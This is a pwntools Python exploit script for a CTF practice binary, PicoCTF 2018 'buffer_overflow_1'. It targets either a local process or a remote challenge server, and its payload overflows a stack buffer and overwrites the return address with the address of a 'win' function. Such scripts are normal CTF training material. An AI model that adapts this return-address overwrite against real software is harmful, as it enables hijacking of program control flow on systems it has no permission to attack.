#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./PicoCTF_2018_buffer_overflow_1')
	elf = ELF('./PicoCTF_2018_buffer_overflow_1',checksec=False)

else:
	p = remote('node3.buuoj.cn',29390)
	elf = ELF('./PicoCTF_2018_buffer_overflow_1',checksec=False)


win = 0x80485CB
offset = 0x28

payload = 'A' * offset + 'dead' + p32(win)
sla("Please enter your string: \n",payload)

ia()